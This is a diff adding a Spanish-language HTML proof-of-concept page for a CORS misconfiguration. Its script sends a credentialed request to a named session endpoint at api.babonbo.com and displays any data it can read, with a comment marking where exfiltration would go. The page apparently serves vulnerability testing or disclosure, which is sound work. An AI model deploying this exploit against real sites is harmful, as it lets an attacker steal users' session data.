@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CORS Vulnerability PoC - Data Theft Simulation</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 40px; background-color: #f4f4f4; }
+        .container { max-width: 800px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+        .result { margin-top: 20px; padding: 15px; border: 1px solid #ccc; background-color: #e9e9e9; }
+        h1 { color: #d63031; }
+        pre { background: #2d3436; color: #dfe6e9; padding: 15px; border-radius: 5px; overflow-x: auto; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🚨 Sitio de Ataque Simulado</h1>
+        <p>Este sitio web malicioso alojado en su dominio intentará robar la información de sesión del usuario en <code>api.babonbo.com</code> aprovechando la configuración vulnerable de CORS.</p>
+        
+        <button onclick="attackAndStealData()">1. Ejecutar Ataque CORS</button>
+        
+        <div id="result" class="result">Esperando ejecución...</div>
+
+        <script>
+        async function attackAndStealData() {
+            const resultDiv = document.getElementById('result');
+            const sensitiveURL = 'https://api.babonbo.com/api/auth/session'; 
+            
+            resultDiv.innerHTML = 'Enviando solicitud GET con credenciales a ' + sensitiveURL + '...';
+
+            try {
+                // Paso 1: Realizar solicitud GET con cookies (credenciales)
+                const response = await fetch(sensitiveURL, {
+                    method: 'GET',
+                    mode: 'cors',
+                    credentials: 'include' // Esto adjunta las cookies de 'api.babonbo.com'
+                });
+
+                // Si la respuesta es exitosa (el servidor permite el origen y credenciales)
+                if (response.ok) {
+                    // Paso 2: Leer el cuerpo de la respuesta (los datos sensibles)
+                    const data = await response.json(); 
+
+                    // SIMULACIÓN DE EXFILTRACIÓN: Aquí el atacante enviaría la data a su propio servidor
+                    
+                    resultDiv.innerHTML = `
+                        <h3>✅ ATAQUE EXITOSO (VULNERABLE)</h3>
+                        <p style="color: red; font-weight: bold;">El JavaScript pudo leer los datos sensibles:</p>
+                        <pre>${JSON.stringify(data, null, 2)}</pre>
+                        <p>El servidor es vulnerable a la lectura de datos por parte de su dominio.</p>
+                    `;
+                } else {
+                    resultDiv.innerHTML = `
+                        <h3>❌ SOLICITUD NO EXITOSA</h3>
+                        <p>El servidor respondió con código de estado: ${response.status}. Revise la Consola (F12) para ver si hay un bloqueo CORS.</p>
+                    `;
+                }
+
+            } catch (error) {
+                // Este error ocurre si el navegador bloquea la solicitud (servidor seguro)
+                resultDiv.innerHTML = `
+                    <h3>🛡️ ATAQUE BLOQUEADO (SEGURO)</h3>
+                    <p>El navegador bloqueó la solicitud CORS. Esto indica una configuración de CORS segura o que ${sensitiveURL} no es un endpoint válido/sensible.</p>
+                    <p>Error en la Consola (F12): <code>${error.message}</code></p>
+                `;
+            }
+        }
+        </script>
+    </div>
+</body>
+</html>
